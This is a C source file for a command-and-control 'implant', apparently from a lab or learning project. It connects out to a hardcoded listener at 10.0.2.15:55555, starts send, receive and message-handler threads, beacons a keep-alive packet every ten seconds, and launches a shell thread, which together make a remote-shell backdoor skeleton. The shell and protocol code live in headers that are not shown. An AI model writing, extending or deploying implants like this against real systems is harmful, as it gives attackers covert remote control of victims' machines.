#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <stdbool.h>
#include <signal.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "utility.h"
#include "implant.h"
#include "queue.h"
#include "agent_comms.h"
#include "agent_handler.h"
#include "shell.h"

#define ALIVE_FREQUENCY	10

// Globals
// Receive Queue
Queue* agent_receive_queue;
pthread_mutex_t agent_receive_queue_lock;
// Send Queue
Queue* agent_send_queue;
pthread_mutex_t agent_send_queue_lock;
// Shell Receive Queue
Queue* shell_receive_queue;
pthread_mutex_t shell_receive_queue_lock;
// Shell Send Queue
Queue* shell_send_queue;
pthread_mutex_t shell_send_queue_lock;
// Start time
time_t start_time;
// Alarm flag
volatile sig_atomic_t agent_alive_flag = false;

void agent_alive_alarm(int sig){
	agent_alive_flag = true;
}

void *keep_alive(void *vargp){
	Fragment* fragment;
	Queue_Message* message;
	
	signal(SIGALRM, agent_alive_alarm);
	alarm(ALIVE_FREQUENCY);
	for (;;){
		sleep(1);
		if (agent_alive_flag){
			debug_print("%s\n", "Sending alive packet");
			
			fragment = malloc(sizeof(Fragment));
			memset(fragment, 0, sizeof(Fragment));
			// set first 4 bytes of message to message size (4 bytes)
			fragment->first_payload.total_size = htonl(sizeof(fragment->first_payload.alive_time));
			fragment->first_payload.alive_time = htonl(time(NULL) - start_time);
			
			message = malloc(sizeof(Queue_Message));
			memset(message, 0, sizeof(Queue_Message));
			
			// size = type (4 bytes) + index (4 bytes) + payload size (4 bytes) + alive time (4 bytes)
			message->size = sizeof(fragment->type) + sizeof(fragment->index) + sizeof(fragment->first_payload.total_size) + sizeof(fragment->first_payload.alive_time);
			message->fragment = fragment;
			
			enqueue(agent_send_queue, &agent_send_queue_lock, message);
			
			agent_alive_flag = false;
			alarm(ALIVE_FREQUENCY);
		}
	}
}

int connect_to_listener(char* ip_addr, int port){

    int sockfd;
    int status;
    char* buffer;
    char* message = "Implant Alive\n";
    struct sockaddr_in addr;
    pthread_t agent_receive_tid, agent_send_tid, agent_message_handler_tid, keep_alive_tid, shell_tid;

    if (ip_addr == NULL || !port){
        printf("Bad IP or port\n");
        return RET_ERROR;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip_addr, &addr.sin_addr) <= 0){
        printf("inet_pton failed\n");
        return RET_ERROR;
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        printf("socket failed\n");
        return RET_ERROR;
    }

    if ((status = connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) < 0){
        printf("connect failed\n");
        return RET_ERROR;
    }
    
    // Start agent receive thread
    pthread_create(&agent_receive_tid, NULL, agent_receive, &sockfd);
    // Start agent send thread
    pthread_create(&agent_send_tid, NULL, agent_send, &sockfd);
    // Start agent message handler thread
    pthread_create(&agent_message_handler_tid, NULL, agent_handle_message, &sockfd);
    // Start keep alive thread
    pthread_create(&keep_alive_tid, NULL, keep_alive, NULL);
    // Start shell thread
    pthread_create(&shell_tid, NULL, shell_thread, NULL);
    
    agent_alive_flag = true;
    
    pthread_join(agent_receive_tid, NULL);
    pthread_join(agent_send_tid, NULL);
    pthread_join(agent_message_handler_tid, NULL);
    pthread_join(keep_alive_tid, NULL);
    pthread_join(shell_tid, NULL);

    close(sockfd);
    return RET_OK;;
}

#ifndef UNIT_TESTING
int main(int argc, char** argv){
    char* ip_addr = "10.0.2.15";
    int port = 55555;
    
    start_time = time(NULL);
    
    // Create receive queue
    agent_receive_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&agent_receive_queue_lock, NULL);
    // Create send queue
    agent_send_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&agent_send_queue_lock, NULL);
    // Create shell receive queue
    shell_receive_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&shell_receive_queue_lock, NULL);
    // Create shell send queue
    shell_send_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&shell_send_queue_lock, NULL);
    
    connect_to_listener(ip_addr, port);
    return RET_OK;;
}
#endif /* UNIT_TESTING */


